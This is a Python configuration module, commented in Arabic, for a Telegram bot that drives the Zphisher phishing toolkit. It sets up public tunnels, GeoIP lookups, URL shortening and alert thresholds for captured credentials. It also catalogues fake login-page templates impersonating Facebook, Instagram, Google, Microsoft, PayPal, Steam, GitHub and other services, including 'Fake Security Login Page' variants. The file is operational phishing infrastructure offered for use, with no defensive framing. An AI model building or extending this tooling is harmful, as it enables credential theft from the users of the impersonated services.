"""
🔧 نظام التكوين المتقدم لبوت Zphisher Telegram
يدعم التحقق من صحة البيانات، التشفير، والإعدادات الديناميكية
"""

import os
import secrets
import base64
from pathlib import Path
from typing import List, Optional, Dict, Any
from pydantic import BaseSettings, Field, validator
from cryptography.fernet import Fernet
from enum import Enum
import logging

class LogLevel(str, Enum):
    """مستويات السجل المدعومة"""
    DEBUG = "DEBUG"
    INFO = "INFO"
    WARNING = "WARNING"
    ERROR = "ERROR"
    CRITICAL = "CRITICAL"

class TunnelType(str, Enum):
    """أنواع الأنفاق المدعومة"""
    LOCALHOST = "localhost"
    CLOUDFLARED = "cloudflared"
    LOCALXPOSE = "localxpose"

class UserRole(str, Enum):
    """أدوار المستخدمين"""
    SUPER_ADMIN = "super_admin"
    ADMIN = "admin"
    OPERATOR = "operator"
    VIEWER = "viewer"
    BANNED = "banned"

class Settings(BaseSettings):
    """إعدادات البوت الرئيسية مع التحقق التلقائي"""
    
    # ===========================================
    # إعدادات البوت الأساسية
    # ===========================================
    BOT_TOKEN: str = Field(..., description="رمز البوت من BotFather")
    BOT_NAME: str = Field(default="ZphisherProBot", description="اسم البوت")
    WEBHOOK_URL: Optional[str] = Field(default=None, description="رابط الويب هوك")
    
    # ===========================================
    # إعدادات الإدارة
    # ===========================================
    ADMIN_USER_IDS: str = Field(default="", description="معرفات المسؤولين مفصولة بفواصل")
    SUPER_ADMIN_ID: int = Field(..., description="معرف المسؤول الرئيسي")
    
    # ===========================================
    # إعدادات قاعدة البيانات
    # ===========================================
    DATABASE_URL: str = Field(default="sqlite+aiosqlite:///./data/bot.db")
    DATABASE_ECHO: bool = Field(default=False)
    DATABASE_POOL_SIZE: int = Field(default=20)
    DATABASE_MAX_OVERFLOW: int = Field(default=0)
    
    # ===========================================
    # إعدادات الأمان
    # ===========================================
    SECRET_KEY: str = Field(default_factory=lambda: secrets.token_urlsafe(32))
    JWT_SECRET: str = Field(default_factory=lambda: secrets.token_urlsafe(32))
    ENCRYPTION_KEY: str = Field(default_factory=lambda: base64.urlsafe_b64encode(Fernet.generate_key()).decode())
    SESSION_LIFETIME: int = Field(default=3600, description="مدة الجلسة بالثواني")
    
    # ===========================================
    # إعدادات Zphisher
    # ===========================================
    ZPHISHER_PATH: str = Field(default="../zphisher.sh")
    ZPHISHER_SITES_PATH: str = Field(default="../.sites/")
    ZPHISHER_AUTH_PATH: str = Field(default="../auth/")
    ZPHISHER_SERVER_PATH: str = Field(default="../.server/")
    
    # ===========================================
    # إعدادات خدمات الأنفاق
    # ===========================================
    CLOUDFLARED_PATH: str = Field(default="../.server/cloudflared")
    LOCALXPOSE_PATH: str = Field(default="../.server/loclx")
    LOCALXPOSE_TOKEN: Optional[str] = Field(default=None)
    
    # ===========================================
    # إعدادات المراقبة والسجلات
    # ===========================================
    LOG_LEVEL: LogLevel = Field(default=LogLevel.INFO)
    LOG_FILE: str = Field(default="./logs/bot.log")
    ENABLE_DEBUG: bool = Field(default=False)
    MONITORING_INTERVAL: int = Field(default=5, description="فترة المراقبة بالثواني")
    
    # ===========================================
    # إعدادات تخزين الملفات
    # ===========================================
    UPLOAD_PATH: str = Field(default="./data/uploads/")
    REPORTS_PATH: str = Field(default="./data/reports/")
    BACKUPS_PATH: str = Field(default="./data/backups/")
    MAX_FILE_SIZE: str = Field(default="50MB")
    
    # ===========================================
    # إعدادات الحد من المعدل
    # ===========================================
    RATE_LIMIT_PER_MINUTE: int = Field(default=30)
    RATE_LIMIT_PER_HOUR: int = Field(default=200)
    RATE_LIMIT_BURST: int = Field(default=10)
    
    # ===========================================
    # إعدادات الويب هوك
    # ===========================================
    USE_WEBHOOK: bool = Field(default=False)
    WEBHOOK_HOST: str = Field(default="0.0.0.0")
    WEBHOOK_PORT: int = Field(default=8443)
    WEBHOOK_SSL_CERT: Optional[str] = Field(default=None)
    WEBHOOK_SSL_PRIV: Optional[str] = Field(default=None)
    
    # ===========================================
    # إعدادات الخدمات الخارجية
    # ===========================================
    GEOIP_DATABASE_PATH: str = Field(default="./data/GeoLite2-City.mmdb")
    URL_SHORTENER_API_KEY: Optional[str] = Field(default=None)
    
    # ===========================================
    # إعدادات الإشعارات
    # ===========================================
    ENABLE_NOTIFICATIONS: bool = Field(default=True)
    NOTIFICATION_INTERVAL: int = Field(default=60)
    ALERT_THRESHOLD_IP: int = Field(default=5)
    ALERT_THRESHOLD_CREDS: int = Field(default=3)
    
    class Config:
        env_file = ".env"
        env_file_encoding = "utf-8"
        case_sensitive = True
        
    @validator('BOT_TOKEN')
    def validate_bot_token(cls, v):
        """التحقق من صحة رمز البوت"""
        if not v or len(v) < 40:
            raise ValueError("رمز البوت غير صحيح - يجب أن يكون من BotFather")
        return v
    
    @validator('ADMIN_USER_IDS')
    def validate_admin_ids(cls, v):
        """التحقق من صحة معرفات المسؤولين"""
        if not v:
            return []
        try:
            ids = [int(id_str.strip()) for id_str in v.split(',') if id_str.strip()]
            return ids
        except ValueError:
            raise ValueError("معرفات المسؤولين يجب أن تكون أرقام صحيحة مفصولة بفواصل")
    
    @validator('SUPER_ADMIN_ID')
    def validate_super_admin_id(cls, v):
        """التحقق من معرف المسؤول الرئيسي"""
        if v <= 0:
            raise ValueError("معرف المسؤول الرئيسي يجب أن يكون رقم موجب")
        return v
    
    @validator('SESSION_LIFETIME')
    def validate_session_lifetime(cls, v):
        """التحقق من مدة الجلسة"""
        if v < 300:  # 5 دقائق كحد أدنى
            raise ValueError("مدة الجلسة يجب ألا تقل عن 5 دقائق (300 ثانية)")
        return v
    
    @validator('MAX_FILE_SIZE')
    def validate_max_file_size(cls, v):
        """تحويل حجم الملف إلى بايت"""
        if v.upper().endswith('MB'):
            return int(v[:-2]) * 1024 * 1024
        elif v.upper().endswith('KB'):
            return int(v[:-2]) * 1024
        elif v.upper().endswith('GB'):
            return int(v[:-2]) * 1024 * 1024 * 1024
        else:
            return int(v)
    
    def get_admin_ids(self) -> List[int]:
        """الحصول على قائمة معرفات المسؤولين"""
        admin_ids = self.ADMIN_USER_IDS if isinstance(self.ADMIN_USER_IDS, list) else []
        if self.SUPER_ADMIN_ID not in admin_ids:
            admin_ids.append(self.SUPER_ADMIN_ID)
        return admin_ids
    
    def is_admin(self, user_id: int) -> bool:
        """التحقق من كون المستخدم مسؤول"""
        return user_id in self.get_admin_ids()
    
    def is_super_admin(self, user_id: int) -> bool:
        """التحقق من كون المستخدم مسؤول رئيسي"""
        return user_id == self.SUPER_ADMIN_ID
    
    def get_encryption_key(self) -> bytes:
        """الحصول على مفتاح التشفير"""
        return base64.urlsafe_b64decode(self.ENCRYPTION_KEY.encode())
    
    def get_fernet(self) -> Fernet:
        """الحصول على كائن التشفير Fernet"""
        return Fernet(self.get_encryption_key())

class ZphisherSites:
    """قاموس المواقع المدعومة في Zphisher"""
    
    SOCIAL_MEDIA = {
        'facebook': {
            'name': '📘 Facebook',
            'variants': [
                {'key': 'facebook', 'name': 'Traditional Login Page'},
                {'key': 'fb_advanced', 'name': 'Advanced Voting Poll Login Page'},
                {'key': 'fb_security', 'name': 'Fake Security Login Page'},
                {'key': 'fb_messenger', 'name': 'Facebook Messenger Login Page'}
            ],
            'category': 'social'
        },
        'instagram': {
            'name': '📷 Instagram',
            'variants': [
                {'key': 'instagram', 'name': 'Traditional Login Page'},
                {'key': 'ig_followers', 'name': 'Auto Followers Login Page'},
                {'key': 'insta_followers', 'name': '1000 Followers Login Page'},
                {'key': 'ig_verify', 'name': 'Blue Badge Verify Login Page'}
            ],
            'category': 'social'
        },
        'twitter': {'name': '🐦 Twitter', 'key': 'twitter', 'category': 'social'},
        'tiktok': {'name': '🎵 TikTok', 'key': 'tiktok', 'category': 'social'},
        'snapchat': {'name': '👻 Snapchat', 'key': 'snapchat', 'category': 'social'},
        'discord': {'name': '🎮 Discord', 'key': 'discord', 'category': 'social'},
        'reddit': {'name': '🔥 Reddit', 'key': 'reddit', 'category': 'social'},
        'vk': {
            'name': '🌐 VK',
            'variants': [
                {'key': 'vk', 'name': 'Traditional Login Page'},
                {'key': 'vk_poll', 'name': 'Advanced Voting Poll Login Page'}
            ],
            'category': 'social'
        }
    }
    
    PROFESSIONAL = {
        'linkedin': {'name': '💼 LinkedIn', 'key': 'linkedin', 'category': 'professional'},
        'github': {'name': '🐙 GitHub', 'key': 'github', 'category': 'professional'},
        'gitlab': {'name': '🦊 GitLab', 'key': 'gitlab', 'category': 'professional'},
        'stackoverflow': {'name': '📚 StackOverflow', 'key': 'stackoverflow', 'category': 'professional'}
    }
    
    CLOUD_SERVICES = {
        'google': {
            'name': '📧 Google',
            'variants': [
                {'key': 'google', 'name': 'Gmail Old Login Page'},
                {'key': 'google_new', 'name': 'Gmail New Login Page'},
                {'key': 'google_poll', 'name': 'Advanced Voting Poll'}
            ],
            'category': 'cloud'
        },
        'microsoft': {'name': '🏢 Microsoft', 'key': 'microsoft', 'category': 'cloud'},
        'dropbox': {'name': '📦 DropBox', 'key': 'dropbox', 'category': 'cloud'},
        'mediafire': {'name': '📁 MediaFire', 'key': 'mediafire', 'category': 'cloud'}
    }
    
    GAMING = {
        'steam': {'name': '🎮 Steam', 'key': 'steam', 'category': 'gaming'},
        'playstation': {'name': '🎮 PlayStation', 'key': 'playstation', 'category': 'gaming'},
        'xbox': {'name': '🎮 Xbox', 'key': 'xbox', 'category': 'gaming'},
        'roblox': {'name': '🧱 Roblox', 'key': 'roblox', 'category': 'gaming'},
        'twitch': {'name': '🟣 Twitch', 'key': 'twitch', 'category': 'gaming'},
        'origin': {'name': '🎮 Origin', 'key': 'origin', 'category': 'gaming'}
    }
    
    ECOMMERCE = {
        'paypal': {'name': '💳 PayPal', 'key': 'paypal', 'category': 'ecommerce'},
        'ebay': {'name': '🛒 eBay', 'key': 'ebay', 'category': 'ecommerce'},
        'netflix': {'name': '🎬 Netflix', 'key': 'netflix', 'category': 'ecommerce'},
        'spotify': {'name': '🎵 Spotify', 'key': 'spotify', 'category': 'ecommerce'},
        'adobe': {'name': '🎨 Adobe', 'key': 'adobe', 'category': 'ecommerce'}
    }
    
    OTHER = {
        'pinterest': {'name': '📌 Pinterest', 'key': 'pinterest', 'category': 'other'},
        'quora': {'name': '❓ Quora', 'key': 'quora', 'category': 'other'},
        'protonmail': {'name': '🔒 ProtonMail', 'key': 'protonmail', 'category': 'other'},
        'deviantart': {'name': '🎨 DeviantArt', 'key': 'deviantart', 'category': 'other'},
        'badoo': {'name': '💕 Badoo', 'key': 'badoo', 'category': 'other'},

        'yahoo': {'name': '📧 Yahoo', 'key': 'yahoo', 'category': 'other'},
        'wordpress': {'name': '📝 WordPress', 'key': 'wordpress', 'category': 'other'},
        'yandex': {'name': '🔍 Yandex', 'key': 'yandex', 'category': 'other'}
    }
    
    @classmethod
    def get_all_sites(cls) -> Dict[str, Dict]:
        """الحصول على جميع المواقع المدعومة"""
        all_sites = {}
        for category in [cls.SOCIAL_MEDIA, cls.PROFESSIONAL, cls.CLOUD_SERVICES, 
                        cls.GAMING, cls.ECOMMERCE, cls.OTHER]:
            all_sites.update(category)
        return all_sites
    
    @classmethod
    def get_sites_by_category(cls, category: str) -> Dict[str, Dict]:
        """الحصول على المواقع حسب الفئة"""
        category_map = {
            'social': cls.SOCIAL_MEDIA,
            'professional': cls.PROFESSIONAL,
            'cloud': cls.CLOUD_SERVICES,
            'gaming': cls.GAMING,
            'ecommerce': cls.ECOMMERCE,
            'other': cls.OTHER
        }
        return category_map.get(category, {})
    
    @classmethod
    def get_site_info(cls, site_key: str) -> Optional[Dict]:
        """الحصول على معلومات موقع محدد"""
        all_sites = cls.get_all_sites()
        return all_sites.get(site_key)

class SecurityManager:
    """مدير الأمان المتقدم"""
    
    def __init__(self, settings: Settings):
        self.settings = settings
        self.fernet = settings.get_fernet()
    
    def encrypt_data(self, data: str) -> str:
        """تشفير البيانات الحساسة"""
        try:
            encrypted_data = self.fernet.encrypt(data.encode())
            return base64.urlsafe_b64encode(encrypted_data).decode()
        except Exception as e:
            logging.error(f"خطأ في تشفير البيانات: {e}")
            raise
    
    def decrypt_data(self, encrypted_data: str) -> str:
        """فك تشفير البيانات"""
        try:
            decoded_data = base64.urlsafe_b64decode(encrypted_data.encode())
            decrypted_data = self.fernet.decrypt(decoded_data)
            return decrypted_data.decode()
        except Exception as e:
            logging.error(f"خطأ في فك تشفير البيانات: {e}")
            raise
    
    def generate_session_token(self) -> str:
        """إنتاج رمز جلسة آمن"""
        return secrets.token_urlsafe(32)
    
    def hash_password(self, password: str) -> str:
        """تشفير كلمة المرور باستخدام bcrypt"""
        import bcrypt
        return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
    
    def verify_password(self, password: str, hashed: str) -> bool:
        """التحقق من كلمة المرور"""
        import bcrypt
        return bcrypt.checkpw(password.encode('utf-8'), hashed.encode('utf-8'))

# إنشاء مثيل الإعدادات العام
try:
    settings = Settings()
    security_manager = SecurityManager(settings)
    zphisher_sites = ZphisherSites()
    
    # إنشاء المجلدات المطلوبة
    required_dirs = [
        Path(settings.UPLOAD_PATH),
        Path(settings.REPORTS_PATH),
        Path(settings.BACKUPS_PATH),
        Path(settings.LOG_FILE).parent,
        Path('./data')
    ]
    
    for dir_path in required_dirs:
        dir_path.mkdir(parents=True, exist_ok=True)
    
    print("✅ تم تحميل الإعدادات بنجاح")
    
except Exception as e:
    print(f"❌ خطأ في تحميل الإعدادات: {e}")
    raise